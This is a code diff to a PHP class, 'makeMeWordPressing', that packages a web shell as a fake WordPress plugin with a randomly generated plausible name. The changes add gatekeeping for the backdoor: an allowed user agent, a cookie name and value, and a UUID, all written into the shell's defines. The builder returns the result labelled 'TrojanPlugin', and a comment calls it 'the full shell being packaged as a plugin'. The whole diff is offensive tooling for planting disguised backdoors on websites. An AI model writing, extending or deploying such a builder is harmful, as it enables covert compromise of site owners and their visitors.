@@ -11,14 +11,22 @@ class makeMeWordPressing extends \ZipArchive
 
     private \Faker\Generator $faker;
     protected string $activator;
+    protected string $allowed_agent;
+    protected string $cookie_name;
+    protected string $cookie_value;
+    protected string $auth_uuid;
     private string $spoof_directory_name;
     private string $random_name;
 
-    function __construct(string $activator)
+    function __construct(string $activator, string $allowed_agent, string $cookie_name, string $cookie_value)
     {
         $this->faker = Factory::create();
         $this->random_name = bin2hex(openssl_random_pseudo_bytes(24));
         $this->activator = $activator;
+        $this->allowed_agent = $allowed_agent;
+        $this->cookie_name = $cookie_name;
+        $this->cookie_value = $cookie_value;
+        $this->auth_uuid = vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex(openssl_random_pseudo_bytes(16)), 4));
         $this->spoof_directory_name = $this->faker->word();
         if (is_dir($this->spoof_directory_name)){
             rmdir($this->spoof_directory_name);
@@ -59,6 +67,15 @@ class makeMeWordPressing extends \ZipArchive
         }
         $base .= "*/\n";
         $slop = file('slop.php');
+        if ($slop === false){
+            return [
+                null
+            ];
+        }
+        $slop[4] = "\tdefine(\"allow_agent\", \"{$this->allowed_agent}\");".PHP_EOL;
+        $slop[7] = "\tdefine(\"uuid\", \"{$this->auth_uuid}\");".PHP_EOL;
+        $slop[10] = "\tdefine(\"cval\", \"{$this->cookie_value}\");".PHP_EOL;
+        $slop[11] = "\tdefine(\"cname\", \"{$this->cookie_name}\");".PHP_EOL;
         foreach (explode($base, "\n") as $baseline){
             $alt = 1;
             $slop[$alt] .= $baseline;
@@ -81,8 +98,12 @@ class makeMeWordPressing extends \ZipArchive
         }
         file_put_contents($spoof_name, implode("", $slop));
         return [
-            "TrojanPlugin" => $this->packZipArchive($spoof_name, $spoof['Plugin Name:'], "chonker"),
-            "ActivationWord" => "Chonker-" . bin2hex(openssl_random_pseudo_bytes(10))
+            "TrojanPlugin" => $this->packZipArchive($spoof_name, $spoof['Plugin Name:'], "chonker"), // activation word is useless because this is the full shell being packaged as a plugin.
+            "ActivationWord" => "Chonker-" . bin2hex(openssl_random_pseudo_bytes(10)),
+            "UUID" => $this->auth_uuid,
+            "CookieValue" => $this->cookie_value,
+            "CookieName" => $this->cookie_name,
+            "AllowedAgent" => $this->allowed_agent
         ];
     }
 
